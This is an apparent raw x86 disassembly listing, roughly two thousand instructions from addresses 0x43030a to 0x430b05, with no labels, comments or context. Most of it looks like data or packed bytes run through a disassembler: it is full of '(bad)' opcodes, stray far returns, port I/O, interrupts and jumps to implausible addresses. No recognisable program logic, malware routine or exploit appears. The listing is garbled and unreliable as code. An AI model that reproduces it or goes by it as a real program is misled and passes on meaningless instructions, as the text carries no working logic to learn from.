  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
